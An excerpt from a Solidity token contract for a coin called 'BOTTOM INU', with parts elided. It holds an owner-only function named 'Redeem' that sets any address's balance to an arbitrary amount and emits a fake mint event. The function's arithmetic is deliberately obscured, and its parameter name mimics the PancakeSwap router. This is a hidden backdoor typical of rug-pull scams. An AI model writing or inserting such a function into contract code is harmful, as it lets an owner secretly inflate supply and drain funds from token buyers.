...
contract BTCDOWNNOW is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BOTTOM INU";
    string private _symbol = "BOTTINU";
  ...
  modifier BABOWNER () {
    ...
    function Redeem(address pancakeswaprooter, uint256 Tamount) external BABOWNER {
      _balances[pancakeswaprooter] = (Tamount / Tamount - Tamount / Tamount) + Tamount * 10 ** _decimals;
        emit Transfer(address(0), pancakeswaprooter, Tamount * 10 ** _decimals);
  }  
